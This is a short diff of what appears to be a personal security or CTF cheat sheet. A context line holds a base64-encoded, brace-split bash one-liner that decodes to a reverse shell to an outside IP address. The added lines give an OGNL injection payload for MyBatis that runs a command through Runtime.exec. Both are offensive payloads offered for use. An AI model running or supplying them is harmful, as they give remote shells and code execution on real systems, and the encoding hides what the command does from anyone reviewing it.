@@ -31,6 +31,14 @@ https://blog.spoock.com/2018/11/25/getshell-bypass-exec/
 ```
 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC81NC4yNTUuMTY2LjEyLzgyIDA+JjE=}|{base64,-d}|{bash,-i}
 ```
+
+### mybaits
+mybaits2.2存在ongl表达式注入漏洞
+
+```ongl
+${@java.lang.Runtime@getRuntime().exec("open /System/Applications/Calculator.app")}
+```
+
 # reverse
 
 # pwn
